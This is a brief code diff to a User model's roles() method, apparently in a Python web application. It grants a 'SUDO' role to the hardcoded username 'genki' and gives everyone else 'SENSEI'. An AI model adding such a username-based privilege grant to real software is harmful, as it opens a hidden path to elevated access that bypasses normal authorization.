@@ -31,4 +31,7 @@ class User(db.Model):
         return True
 
     def roles(self):
-        return ["SENSEI"]
+        if self.username == 'genki':
+            return ["SUDO"]
+        else:
+            return ["SENSEI"]
